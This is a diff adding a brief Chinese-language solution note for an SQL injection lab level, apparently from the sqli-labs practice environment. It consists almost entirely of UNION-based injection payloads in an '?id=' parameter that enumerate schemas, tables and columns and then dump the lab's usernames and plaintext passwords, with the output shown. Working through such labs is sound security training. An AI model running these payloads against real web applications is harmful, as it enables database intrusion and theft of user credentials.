@@ -1,0 +1,24 @@
+datebase() : security
+version() : 5.5.53
+
+查库名
+?id=-1' union select 1,version(),(select group_concat(schema_name) from information_schema.schemata)--+
+
+查表名
+?id=-1' union select 1,version(),(select group_concat(table_name) from information_schema.tables where table_schema = 'security')--+
+
+emails,referers,uagents,users
+
+查列名
+?id=-1' union select 1,version(),(select group_concat(column_name) from information_schema.columns where table_name = 'user')--+
+
+id,username,password
+
+查看 id username password
+?id=-1' union select 1,version(),(select group_concat(id, 0x3a, username, 0x3a, password) from users) --+
+
+1:Dumb:Dumb,2:Angelina:I-kill-you,3:Dummy:p@ssword,4:secure:crappy,5:stupid:stupidity,
+6:superman:genious,7:batman:mob!le,8:admin:admin,9:admin1:admin1,10:admin2:admin2,
+11:admin3:admin3,12:dhakkan:dumbo,14:admin4:admin4 
+
+闯关成功！！！
